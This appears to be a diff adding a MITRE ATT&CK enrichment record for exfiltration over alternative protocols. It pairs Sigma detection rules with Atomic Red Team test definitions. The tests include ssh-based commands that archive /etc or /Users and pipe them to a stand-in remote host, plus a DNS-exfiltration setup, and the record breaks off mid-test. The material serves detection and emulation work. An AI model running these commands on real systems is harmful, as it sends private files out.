@@ -1,0 +1,395 @@
+{
+    "id": "T1048",
+    "name": "Exfiltration Over Alternative Protocol",
+    "description": "Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.\nAlternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Different protocol channels could also include Web services such as cloud storage. Adversaries may also opt to encrypt and/or obfuscate these alternate channels.\n[Exfiltration Over Alternative Protocol](T1048) can be done using various common operating system utilities such as [Net](S0039)/SMB or FTP.(Citation: Palo Alto OilRig Oct 2016) On macOS and Linux `curl` may be used to invoke protocols such as HTTP/S or FTP/S to exfiltrate data from a system.(Citation: 20 macOS Common Tools and Techniques)",
+    "platforms": "Linux, macOS, Windows",
+    "kill_chain_phases": "Exfiltration",
+    "data_sources": "Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Flow, Network Traffic: Network Traffic Content, File: File Access, Command: Command Execution",
+    "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)",
+    "url": "https://attack.mitre.org/techniques/T1048",
+    "enrichments": {
+        "attack_rule_map": [],
+        "cycat": {
+            "cycat": {
+                "cycat_related_uuids": [
+                    "d59d7842-9a21-4bc6-ba98-64bfe0091355",
+                    "855bc8b5-2ae8-402e-a9ed-b889e6df1900",
+                    "9c8afa4d-0022-48f0-9456-3712466f9701",
+                    "5d6e7aa3-aca4-46cc-b96a-46ac950d210f",
+                    "83e15192-96d8-476c-aa39-0317de8dba80",
+                    "5c812baa-d614-4f99-88e0-426d950d210f",
+                    "b4163085-4001-46a3-a79a-55d8bbbc7a3a",
+                    "a19e86f8-1c0a-4fea-8407-23b73d615776",
+                    "f0a8cedc-1d22-4453-9c44-8d9f4ebd5d35",
+                    "99793437-3e16-439b-be0f-078782cf953d",
+                    "8e4cf0e5-aa5d-4dc3-beff-dc26917744a9",
+                    "a8322756-015c-42e7-afb1-436e85ed3ff5",
+                    "1ec4b281-aa65-46a2-bdae-5fd830ed914e",
+                    "0f6c1bf5-70a5-4963-aef9-aab1eefb50bd",
+                    "98a96a5a-64a0-4c42-92c5-489da3866cb0",
+                    "a6d67db4-6220-436d-8afc-f3842fe05d43",
+                    "635dbb88-67b3-4b41-9ea5-a3af2dd88153",
+                    "5ba715b6-71b7-44fd-8245-f66893e81b3d",
+                    "44ae5117-9c44-40cf-9c7c-7edad385ca70",
+                    "4153a907-2451-4e4f-a578-c52bb6881432"
+                ],
+                "lookup_results": [
+                    {
+                        "uuid": "d59d7842-9a21-4bc6-ba98-64bfe0091355",
+                        "lookup_data": {
+                            "description": "DNSExfiltrator allows for transferring (exfiltrate) a file over a DNS request covert channel",
+                            "raw": "author: frack113\ndate: 2022/01/07\ndescription: DNSExfiltrator allows for transferring (exfiltrate) a file over a DNS\n  request covert channel\ndetection:\n  condition: selection_cmdlet\n  selection_cmdlet:\n  - ScriptBlockText|contains: Invoke-DNSExfiltrator\n  - ScriptBlockText|contains|all:\n    - ' -i '\n    - ' -d '\n    - ' -p '\n    - ' -doh '\n    - ' -t '\nfalsepositives:\n- Legitimate script\nid: d59d7842-9a21-4bc6-ba98-64bfe0091355\nlevel: high\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1048/T1048.md#atomic-test-3---dnsexfiltration-doh\n- https://github.com/Arno0x/DNSExfiltrator\nstatus: test\ntags:\n- attack.exfiltration\n- attack.t1048\ntitle: Powershell DNSExfiltration\n",
+                            "sigma:id": "d59d7842-9a21-4bc6-ba98-64bfe0091355",
+                            "title": "Powershell DNSExfiltration",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "855bc8b5-2ae8-402e-a9ed-b889e6df1900",
+                        "lookup_data": {
+                            "description": "Detects a suspicious copy command to or from an Admin share or remote",
+                            "raw": "author: Florian Roth (Nextron Systems), oscd.community, Teymur Kheirkhabarov @HeirhabarovT,\n  Zach Stanford @svch0st, Nasreddine Bencherchali\ndate: 2019/12/30\ndescription: Detects a suspicious copy command to or from an Admin share or remote\ndetection:\n  condition: target and (selection_other_tools or all of selection_cmd_* or all of\n    selection_pwsh_*)\n  selection_cmd_cli:\n    CommandLine|contains: copy\n  selection_cmd_img:\n  - Image|endswith: \\cmd.exe\n  - OriginalFileName: Cmd.Exe\n  selection_other_tools:\n  - Image|endswith:\n    - \\robocopy.exe\n    - \\xcopy.exe\n  - OriginalFileName:\n    - robocopy.exe\n    - XCOPY.EXE\n  selection_pwsh_cli:\n    CommandLine|contains:\n    - copy-item\n    - 'copy '\n    - 'cpi '\n    - ' cp '\n    - 'move '\n    - move-item\n    - ' mi '\n    - ' mv '\n  selection_pwsh_img:\n  - Image|contains:\n    - \\powershell.exe\n    - \\pwsh.exe\n  - OriginalFileName:\n    - PowerShell.EXE\n    - pwsh.dll\n  target:\n    CommandLine|contains|all:\n    - \\\\\\\\\n    - $\nfalsepositives:\n- Administrative scripts\nfields:\n- CommandLine\n- ParentCommandLine\nid: 855bc8b5-2ae8-402e-a9ed-b889e6df1900\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/31\nreferences:\n- https://twitter.com/SBousseaden/status/1211636381086339073\n- https://drive.google.com/file/d/1lKya3_mLnR3UQuCoiYruO3qgu052_iS_/view\n- https://www.elastic.co/guide/en/security/current/remote-file-copy-to-a-hidden-share.html\n- https://www.microsoft.com/en-us/security/blog/2022/10/18/defenders-beware-a-case-for-post-ransomware-investigations/\nstatus: test\ntags:\n- attack.lateral_movement\n- attack.collection\n- attack.exfiltration\n- attack.t1039\n- attack.t1048\n- attack.t1021.002\ntitle: Copy from Admin Share\n",
+                            "sigma:id": "855bc8b5-2ae8-402e-a9ed-b889e6df1900",
+                            "title": "Copy from Admin Share",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "9c8afa4d-0022-48f0-9456-3712466f9701",
+                        "lookup_data": {
+                            "description": "Well-known TAP software installation. Possible preparation for data exfiltration using tunnelling techniques",
+                            "raw": "author: Daniil Yugoslavskiy, Ian Davis, oscd.community\ndate: 2019/10/24\ndescription: Well-known TAP software installation. Possible preparation for data exfiltration\n  using tunnelling techniques\ndetection:\n  condition: selection\n  selection:\n    EventID: 4697\n    ServiceFileName|contains: tap0901\nfalsepositives:\n- Legitimate OpenVPN TAP insntallation\nid: 9c8afa4d-0022-48f0-9456-3712466f9701\nlevel: medium\nlogsource:\n  definition: The 'System Security Extension' audit subcategory need to be enabled\n    to log the EID 4697\n  product: windows\n  service: security\nmodified: 2022/11/29\nrelated:\n- id: 8e4cf0e5-aa5d-4dc3-beff-dc26917744a9\n  type: derived\nstatus: test\ntags:\n- attack.exfiltration\n- attack.t1048\ntitle: Tap Driver Installation - Security\n",
+                            "sigma:id": "9c8afa4d-0022-48f0-9456-3712466f9701",
+                            "title": "Tap Driver Installation - Security",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "5d6e7aa3-aca4-46cc-b96a-46ac950d210f",
+                        "lookup_data": {
+                            "description": "SectorJ04 Groupâ€™s Increased Activity in 2019",
+                            "link": "https://www.circl.lu/doc/misp/feed-osint/5d6e7aa3-aca4-46cc-b96a-46ac950d210f.json",
+                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
+                            "timestamp": "1568039252",
+                            "uuid": "5d6e7aa3-aca4-46cc-b96a-46ac950d210f",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "83e15192-96d8-476c-aa39-0317de8dba80",
+                        "lookup_data": {
+                            "description": "OSINT - Uber Breach & Attack Analysis",
+                            "link": "https://www.circl.lu/doc/misp/feed-osint/83e15192-96d8-476c-aa39-0317de8dba80.json",
+                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
+                            "timestamp": "1666020853",
+                            "uuid": "83e15192-96d8-476c-aa39-0317de8dba80",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "5c812baa-d614-4f99-88e0-426d950d210f",
+                        "lookup_data": {
+                            "description": "OSINT -  New SLUB Backdoor Uses GitHub, Communicates via Slack",
+                            "link": "https://www.circl.lu/doc/misp/feed-osint/5c812baa-d614-4f99-88e0-426d950d210f.json",
+                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
+                            "timestamp": "1551970460",
+                            "uuid": "5c812baa-d614-4f99-88e0-426d950d210f",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "b4163085-4001-46a3-a79a-55d8bbbc7a3a",
+                        "lookup_data": {
+                            "description": "High DNS requests amount from host per short period of time",
+                            "raw": "author: Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/24\ndescription: High DNS requests amount from host per short period of time\ndetection:\n  condition: selection | count() by src_ip > 1000\n  selection:\n    query: '*'\n  timeframe: 1m\nfalsepositives:\n- Legitimate high DNS requests rate to domain name which should be added to whitelist\nid: b4163085-4001-46a3-a79a-55d8bbbc7a3a\nlevel: medium\nlogsource:\n  category: dns\nmodified: 2022/10/09\nstatus: test\ntags:\n- attack.exfiltration\n- attack.t1048.003\n- attack.command_and_control\n- attack.t1071.004\ntitle: High DNS Requests Rate\n",
+                            "sigma:id": "b4163085-4001-46a3-a79a-55d8bbbc7a3a",
+                            "title": "High DNS Requests Rate",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "a19e86f8-1c0a-4fea-8407-23b73d615776",
+                        "lookup_data": {
+                            "mitre-attack-id": "T1048",
+                            "mitre-cti:description": "Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.  \n\nAlternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Different protocol channels could also include Web services such as cloud storage. Adversaries may also opt to encrypt and/or obfuscate these alternate channels. \n\n[Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048) can be done using various common operating system utilities such as [Net](https://attack.mitre.org/software/S0039)/SMB or FTP.(Citation: Palo Alto OilRig Oct 2016) On macOS and Linux <code>curl</code> may be used to invoke protocols such as HTTP/S or FTP/S to exfiltrate data from a system.(Citation: 20 macOS Common Tools and Techniques) ",
+                            "mitre-cti:name": "Exfiltration Over Alternative Protocol",
+                            "mitre-cti:type": "attack-pattern",
+                            "raw": "{'x_mitre_platforms': ['Linux', 'macOS', 'Windows'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['William Cain', 'Alfredo Abarca'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'attack-pattern--a19e86f8-1c0a-4fea-8407-23b73d615776', 'type': 'attack-pattern', 'created': '2017-05-31T21:30:44.720Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1048', 'url': 'https://attack.mitre.org/techniques/T1048'}, {'source_name': 'Palo Alto OilRig Oct 2016', 'description': 'Grunzweig, J. and Falcone, R.. (2016, October 4). OilRig Malware Campaign Updates Toolset and Expands Targets. Retrieved May 3, 2017.', 'url': 'http://researchcenter.paloaltonetworks.com/2016/10/unit42-oilrig-malware-campaign-updates-toolset-and-expands-targets/'}, {'source_name': '20 macOS Common Tools and Techniques', 'url': 'https://labs.sentinelone.com/20-common-tools-techniques-used-by-macos-threat-actors-malware/', 'description': 'Phil Stokes. (2021, February 16). 20 Common Tools & Techniques Used by macOS Threat Actors & Malware. Retrieved August 23, 2021.'}, {'url': 'https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf', 'description': 'Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.', 'source_name': 'University of Birmingham C2'}], 'modified': '2021-10-15T22:49:28.766Z', 'name': 'Exfiltration Over Alternative Protocol', 'description': 'Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.  \\n\\nAlternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Different protocol channels could also include Web services such as cloud storage. Adversaries may also opt to encrypt and/or obfuscate these alternate channels. \\n\\n[Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048) can be done using various common operating system utilities such as [Net](https://attack.mitre.org/software/S0039)/SMB or FTP.(Citation: Palo Alto OilRig Oct 2016) On macOS and Linux <code>curl</code> may be used to invoke protocols such as HTTP/S or FTP/S to exfiltrate data from a system.(Citation: 20 macOS Common Tools and Techniques) ', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'exfiltration'}], 'x_mitre_detection': 'Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)', 'x_mitre_version': '1.3', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'x_mitre_data_sources': ['File: File Access', 'Network Traffic: Network Traffic Content', 'Network Traffic: Network Traffic Flow', 'Command: Command Execution', 'Network Traffic: Network Connection Creation'], 'x_mitre_is_subtechnique': False}",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "f0a8cedc-1d22-4453-9c44-8d9f4ebd5d35",
+                        "lookup_data": {
+                            "description": "Extremely high rate of TXT record type DNS requests from host per short period of time. Possible result of Do-exfiltration tool execution",
+                            "raw": "author: Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/24\ndescription: Extremely high rate of TXT record type DNS requests from host per short\n  period of time. Possible result of Do-exfiltration tool execution\ndetection:\n  condition: selection | count() by src_ip > 50\n  selection:\n    record_type: TXT\n  timeframe: 1m\nfalsepositives:\n- Legitimate high DNS TXT requests rate to domain name which should be added to whitelist\nid: f0a8cedc-1d22-4453-9c44-8d9f4ebd5d35\nlevel: medium\nlogsource:\n  category: dns\nmodified: 2021/11/27\nstatus: test\ntags:\n- attack.exfiltration\n- attack.t1048.003\n- attack.command_and_control\n- attack.t1071.004\ntitle: High TXT Records Requests Rate\n",
+                            "sigma:id": "f0a8cedc-1d22-4453-9c44-8d9f4ebd5d35",
+                            "title": "High TXT Records Requests Rate",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "99793437-3e16-439b-be0f-078782cf953d",
+                        "lookup_data": {
+                            "description": "Well-known TAP software installation. Possible preparation for data exfiltration using tunneling techniques",
+                            "raw": "author: Daniil Yugoslavskiy, Ian Davis, oscd.community\ndate: 2019/10/24\ndescription: Well-known TAP software installation. Possible preparation for data exfiltration\n  using tunneling techniques\ndetection:\n  condition: selection and not 1 of filter*\n  filter_avast:\n    Image:\n    - C:\\Program Files\\Avast Software\\SecureLine VPN\\tapinstall.exe\n    - C:\\Program Files (x86)\\Avast Software\\SecureLine VPN\\tapinstall.exe\n  selection:\n    Image|endswith: \\tapinstall.exe\nfalsepositives:\n- Legitimate OpenVPN TAP insntallation\nid: 99793437-3e16-439b-be0f-078782cf953d\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/08/10\nstatus: test\ntags:\n- attack.exfiltration\n- attack.t1048\ntitle: Tap Installer Execution\n",
+                            "sigma:id": "99793437-3e16-439b-be0f-078782cf953d",
+                            "title": "Tap Installer Execution",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "8e4cf0e5-aa5d-4dc3-beff-dc26917744a9",
+                        "lookup_data": {
+                            "description": "Well-known TAP software installation. Possible preparation for data exfiltration using tunnelling techniques",
+                            "raw": "author: Daniil Yugoslavskiy, Ian Davis, oscd.community\ndate: 2019/10/24\ndescription: Well-known TAP software installation. Possible preparation for data exfiltration\n  using tunnelling techniques\ndetection:\n  condition: selection\n  selection:\n    EventID: 7045\n    ImagePath|contains: tap0901\n    Provider_Name: Service Control Manager\nfalsepositives:\n- Legitimate OpenVPN TAP insntallation\nid: 8e4cf0e5-aa5d-4dc3-beff-dc26917744a9\nlevel: medium\nlogsource:\n  product: windows\n  service: system\nmodified: 2022/12/25\nstatus: test\ntags:\n- attack.exfiltration\n- attack.t1048\ntitle: Tap Driver Installation\n",
+                            "sigma:id": "8e4cf0e5-aa5d-4dc3-beff-dc26917744a9",
+                            "title": "Tap Driver Installation",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "a8322756-015c-42e7-afb1-436e85ed3ff5",
+                        "lookup_data": {
+                            "description": "Identifies IPs performing DNS lookups associated with common Tor proxies.",
+                            "raw": "author: Saw Winn Naung , Azure-Sentinel\ndate: 2021/08/15\ndescription: Identifies IPs performing DNS lookups associated with common Tor proxies.\ndetection:\n  condition: selection\n  selection:\n    query:\n    - tor2web.org\n    - tor2web.com\n    - torlink.co\n    - onion.to\n    - onion.ink\n    - onion.cab\n    - onion.nu\n    - onion.link\n    - onion.it\n    - onion.city\n    - onion.direct\n    - onion.top\n    - onion.casa\n    - onion.plus\n    - onion.rip\n    - onion.dog\n    - tor2web.fi\n    - tor2web.blutmagie.de\n    - onion.sh\n    - onion.lu\n    - onion.pet\n    - t2w.pw\n    - tor2web.ae.org\n    - tor2web.io\n    - tor2web.xyz\n    - onion.lt\n    - s1.tor-gateways.de\n    - s2.tor-gateways.de\n    - s3.tor-gateways.de\n    - s4.tor-gateways.de\n    - s5.tor-gateways.de\n    - hiddenservice.net\nfalsepositives:\n- Unknown\nfields:\n- clientip\nid: a8322756-015c-42e7-afb1-436e85ed3ff5\nlevel: medium\nlogsource:\n  product: zeek\n  service: dns\nmodified: 2022/10/09\nreferences:\n- https://github.com/Azure/Azure-Sentinel/blob/f99542b94afe0ad2f19a82cc08262e7ac8e1428e/Detections/ASimDNS/imDNS_TorProxies.yaml\nstatus: test\ntags:\n- attack.exfiltration\n- attack.t1048\ntitle: DNS TOR Proxies\n",
+                            "sigma:id": "a8322756-015c-42e7-afb1-436e85ed3ff5",
+                            "title": "DNS TOR Proxies",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "1ec4b281-aa65-46a2-bdae-5fd830ed914e",
+                        "lookup_data": {
+                            "description": "Normally, DNS logs contain a limited amount of different dns queries for a single domain. This rule detects a high amount of queries for a single domain, which can be an indicator that DNS is used to transfer data.",
+                            "raw": "author: Patrick Bareiss\ndate: 2019/04/07\ndescription: Normally, DNS logs contain a limited amount of different dns queries\n  for a single domain. This rule detects a high amount of queries for a single domain,\n  which can be an indicator that DNS is used to transfer data.\ndetection:\n  condition: selection | count(dns_query) by parent_domain > 1000\n  selection:\n    parent_domain: '*'\nfalsepositives:\n- Valid software, which uses dns for transferring data\nid: 1ec4b281-aa65-46a2-bdae-5fd830ed914e\nlevel: high\nlogsource:\n  category: dns\nmodified: 2021/11/27\nreferences:\n- https://zeltser.com/c2-dns-tunneling/\n- https://patrick-bareiss.com/detect-c2-traffic-over-dns-using-sigma/\nstatus: test\ntags:\n- attack.command_and_control\n- attack.t1071.004\n- attack.exfiltration\n- attack.t1048.003\ntitle: Possible DNS Tunneling\n",
+                            "sigma:id": "1ec4b281-aa65-46a2-bdae-5fd830ed914e",
+                            "title": "Possible DNS Tunneling",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "0f6c1bf5-70a5-4963-aef9-aab1eefb50bd",
+                        "lookup_data": {
+                            "description": "High DNS queries bytes amount from host per short period of time",
+                            "raw": "author: Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/24\ndescription: High DNS queries bytes amount from host per short period of time\ndetection:\n  condition: selection | sum(question_length) by src_ip > 300000\n  selection:\n    query: '*'\n  timeframe: 1m\nfalsepositives:\n- Legitimate high DNS bytes out rate to domain name which should be added to whitelist\nid: 0f6c1bf5-70a5-4963-aef9-aab1eefb50bd\nlevel: medium\nlogsource:\n  category: dns\nmodified: 2022/10/09\nstatus: test\ntags:\n- attack.exfiltration\n- attack.t1048.003\ntitle: High DNS Bytes Out\n",
+                            "sigma:id": "0f6c1bf5-70a5-4963-aef9-aab1eefb50bd",
+                            "title": "High DNS Bytes Out",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "98a96a5a-64a0-4c42-92c5-489da3866cb0",
+                        "lookup_data": {
+                            "description": "Well-known DNS Exfiltration tools execution",
+                            "raw": "author: Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/24\ndescription: Well-known DNS Exfiltration tools execution\ndetection:\n  condition: selection\n  selection:\n  - Image|endswith: \\iodine.exe\n  - Image|contains: \\dnscat2\nfalsepositives:\n- \"Legitimate usage of iodine or dnscat2 \\u2014 DNS Exfiltration tools (unlikely)\"\nid: 98a96a5a-64a0-4c42-92c5-489da3866cb0\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nstatus: test\ntags:\n- attack.exfiltration\n- attack.t1048.001\n- attack.command_and_control\n- attack.t1071.004\n- attack.t1132.001\ntitle: DNS Exfiltration and Tunneling Tools Execution\n",
+                            "sigma:id": "98a96a5a-64a0-4c42-92c5-489da3866cb0",
+                            "title": "DNS Exfiltration and Tunneling Tools Execution",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "a6d67db4-6220-436d-8afc-f3842fe05d43",
+                        "lookup_data": {
+                            "description": "Dnscat exfiltration tool execution",
+                            "raw": "author: Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/24\ndescription: Dnscat exfiltration tool execution\ndetection:\n  condition: selection\n  selection:\n    ScriptBlockText|contains: Start-Dnscat2\nfalsepositives:\n- \"Legitimate usage of PowerShell Dnscat2 \\u2014 DNS Exfiltration tool (unlikely)\"\nid: a6d67db4-6220-436d-8afc-f3842fe05d43\nlevel: critical\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2022/12/25\nstatus: test\ntags:\n- attack.exfiltration\n- attack.t1048\n- attack.execution\n- attack.t1059.001\ntitle: Dnscat Execution\n",
+                            "sigma:id": "a6d67db4-6220-436d-8afc-f3842fe05d43",
+                            "title": "Dnscat Execution",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "635dbb88-67b3-4b41-9ea5-a3af2dd88153",
+                        "lookup_data": {
+                            "description": "Detects an executable in the Windows folder accessing github.com",
+                            "raw": "author: Michael Haag (idea), Florian Roth (Nextron Systems)\ndate: 2017/08/24\ndescription: Detects an executable in the Windows folder accessing github.com\ndetection:\n  condition: selection\n  selection:\n    DestinationHostname|endswith:\n    - .github.com\n    - .githubusercontent.com\n    Image|startswith: C:\\Windows\\\n    Initiated: 'true'\nfalsepositives:\n- Unknown\n- '@subTee in your network'\nid: 635dbb88-67b3-4b41-9ea5-a3af2dd88153\nlevel: high\nlogsource:\n  category: network_connection\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://twitter.com/M_haggis/status/900741347035889665\n- https://twitter.com/M_haggis/status/1032799638213066752\n- https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/data/module_source/exfil/Invoke-ExfilDataToGitHub.ps1\nstatus: test\ntags:\n- attack.lateral_movement\n- attack.t1105\n- attack.exfiltration\n- attack.t1567.001\ntitle: Microsoft Binary Github Communication\n",
+                            "sigma:id": "635dbb88-67b3-4b41-9ea5-a3af2dd88153",
+                            "title": "Microsoft Binary Github Communication",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "5ba715b6-71b7-44fd-8245-f66893e81b3d",
+                        "lookup_data": {
+                            "description": "Detects suspicious user agent string of APT40 Dropbox tool",
+                            "raw": "author: Thomas Patzke\ndate: 2019/11/12\ndescription: Detects suspicious user agent string of APT40 Dropbox tool\ndetection:\n  condition: selection\n  selection:\n    c-useragent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like\n      Gecko) Chrome/36.0.1985.143 Safari/537.36\n    r-dns: api.dropbox.com\nfalsepositives:\n- Old browsers\nfields:\n- c-ip\n- c-uri\nid: 5ba715b6-71b7-44fd-8245-f66893e81b3d\nlevel: high\nlogsource:\n  category: proxy\nmodified: 2021/11/27\nreferences:\n- Internal research from Florian Roth\nstatus: test\ntags:\n- attack.command_and_control\n- attack.t1071.001\n- attack.exfiltration\n- attack.t1567.002\ntitle: APT40 Dropbox Tool User Agent\n",
+                            "sigma:id": "5ba715b6-71b7-44fd-8245-f66893e81b3d",
+                            "title": "APT40 Dropbox Tool User Agent",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "44ae5117-9c44-40cf-9c7c-7edad385ca70",
+                        "lookup_data": {
+                            "description": "Extremely high rate of NULL record type DNS requests from host per short period of time. Possible result of iodine tool execution",
+                            "raw": "author: Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/24\ndescription: Extremely high rate of NULL record type DNS requests from host per short\n  period of time. Possible result of iodine tool execution\ndetection:\n  condition: selection | count() by src_ip > 50\n  selection:\n    record_type: 'NULL'\n  timeframe: 1m\nfalsepositives:\n- Legitimate high DNS NULL requests rate to domain name which should be added to whitelist\nid: 44ae5117-9c44-40cf-9c7c-7edad385ca70\nlevel: medium\nlogsource:\n  category: dns\nmodified: 2021/11/27\nstatus: test\ntags:\n- attack.exfiltration\n- attack.t1048.003\n- attack.command_and_control\n- attack.t1071.004\ntitle: High NULL Records Requests Rate\n",
+                            "sigma:id": "44ae5117-9c44-40cf-9c7c-7edad385ca70",
+                            "title": "High NULL Records Requests Rate",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "4153a907-2451-4e4f-a578-c52bb6881432",
+                        "lookup_data": {
+                            "description": "Detects suspicious DNS queries using base64 encoding",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2018/05/10\ndescription: Detects suspicious DNS queries using base64 encoding\ndetection:\n  condition: selection\n  selection:\n    query|contains: ==.\nfalsepositives:\n- Unknown\nid: 4153a907-2451-4e4f-a578-c52bb6881432\nlevel: medium\nlogsource:\n  category: dns\nmodified: 2022/10/09\nreferences:\n- https://github.com/krmaxwell/dns-exfiltration\nstatus: test\ntags:\n- attack.exfiltration\n- attack.t1048.003\n- attack.command_and_control\n- attack.t1071.004\ntitle: Suspicious DNS Query with B64 Encoded String\n",
+                            "sigma:id": "4153a907-2451-4e4f-a578-c52bb6881432",
+                            "title": "Suspicious DNS Query with B64 Encoded String",
+                            "_cycat_type": "Item"
+                        }
+                    }
+                ]
+            }
+        },
+        "atomics": [
+            {
+                "attack_technique": "T1048",
+                "display_name": "Exfiltration Over Alternative Protocol",
+                "atomic_tests": [
+                    {
+                        "name": "Exfiltration Over Alternative Protocol - SSH",
+                        "auto_generated_guid": "f6786cc8-beda-4915-a4d6-ac2f193bb988",
+                        "description": "Input a domain and test Exfiltration over SSH\n\nRemote to Local\n\nUpon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.\n",
+                        "supported_platforms": [
+                            "macos",
+                            "linux"
+                        ],
+                        "input_arguments": {
+                            "domain": {
+                                "description": "target SSH domain",
+                                "type": "url",
+                                "default": "target.example.com"
+                            }
+                        },
+                        "executor": {
+                            "command": "ssh #{domain} \"(cd /etc && tar -zcvf - *)\" > ./etc.tar.gz\n",
+                            "name": "sh"
+                        }
+                    },
+                    {
+                        "name": "Exfiltration Over Alternative Protocol - SSH",
+                        "auto_generated_guid": "7c3cb337-35ae-4d06-bf03-3032ed2ec268",
+                        "description": "Input a domain and test Exfiltration over SSH\n\nLocal to Remote\n\nUpon successful execution, tar will compress /Users/* directory and password protect the file modification of `Users.tar.gz.enc` as output.\n",
+                        "supported_platforms": [
+                            "macos",
+                            "linux"
+                        ],
+                        "input_arguments": {
+                            "user_name": {
+                                "description": "username for domain",
+                                "type": "string",
+                                "default": "atomic"
+                            },
+                            "password": {
+                                "description": "password for user",
+                                "type": "string",
+                                "default": "atomic"
+                            },
+                            "domain": {
+                                "description": "target SSH domain",
+                                "type": "url",
+                                "default": "target.example.com"
+                            }
+                        },
+                        "executor": {
+                            "command": "tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@#{domain} 'cat > /Users.tar.gz.enc'\n",
+                            "name": "sh"
+                        }
+                    },
+                    {
+                        "name": "DNSExfiltration (doh)",
+                        "auto_generated_guid": "c943d285-ada3-45ca-b3aa-7cd6500c6a48",
+                        "description": "DNSExfiltrator enables the transfer (exfiltration) of a file over a DNS request covert channel. This is basically a data leak testing tool allowing to exfiltrate data over a covert channel.\n!!! Test will fail without a domain under your control with A record and NS record !!! \nSee this github page for more details - https://github.com/Arno0x/DNSExfiltrator\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "password": {
+                                "description": "Password used to encrypt the data to be exfiltrated",
+                                "type": "string",
+                                "default": "atomic"
+                            },
+                            "domain": {
+                                "description": "The domain name to use for DNS requests",
+                                "type": "string",
+                                "default": "target.example.com"
+                            },
+                            "ps_module": {
+                                "description": "DNSExfiltrator powershell ps_module",
+                                "type": "path",
+                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\dnsexfil.ps1"
+                            },
+                            "doh": {
+                                "description": "Google or CloudFlare DoH (DNS over HTTP) server",
+                                "type": "string",
+                                "default": "google"
